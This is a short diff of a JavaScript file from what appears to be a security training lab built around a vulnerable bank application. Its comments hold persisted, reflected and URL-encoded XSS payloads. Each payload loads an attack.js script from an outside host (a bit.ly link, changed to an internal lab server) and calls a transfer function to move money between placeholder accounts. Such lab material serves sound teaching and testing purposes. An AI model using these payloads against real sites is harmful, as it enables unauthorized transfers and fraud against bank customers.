@@ -70,10 +70,10 @@ function submitTransferForm(formname, fromAccount) {
     }
 }
 //persisted XSS:
-//<script src="http://bit.ly/2rvhzPT_attack_js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","100","CHF")</script>
-//<script src="http://bit.ly/2rvhzPT_attack_js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","10000","CHF")</script>
+//<script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","100","CHF")</script>
+//<script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","10000","CHF")</script>
 //reflected XSS:
-//http://sprg-vbank.el.eee.intern/history?accountNo=FROM_ACCOUNT_NO' -- <script src="http://bit.ly/2rvhzPT_attack_js"></script><script>transfer(null,"FROM_ACCOUNT_NO","TO_ACCOUNT_NO","888","CHF")</script>
+//http://sprg-vbank.el.eee.intern/history?accountNo=FROM_ACCOUNT_NO' -- <script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer(null,"FROM_ACCOUNT_NO","TO_ACCOUNT_NO","888","CHF")</script>
 //URL encoded:
 //http%3A%2F%2Fsprg-vbank.el.eee.intern%2Fhistory%3FaccountNo%3DFROM_ACCOUNT_NO%27+--+%3Cscript+src%3D%22http%3A%2F%2Fbit.ly%2F2rvhzPT_attack_js%22%3E%3C%2Fscript%3E%3Cscript%3Etransfer%28null%2C%22FROM_ACCOUNT_NO%22%2C%22TO_ACCOUNT_NO%22%2C%22888%22%2C%22CHF%22%29%3C%2Fscript%3E
 // dec2hex :: Integer -> String
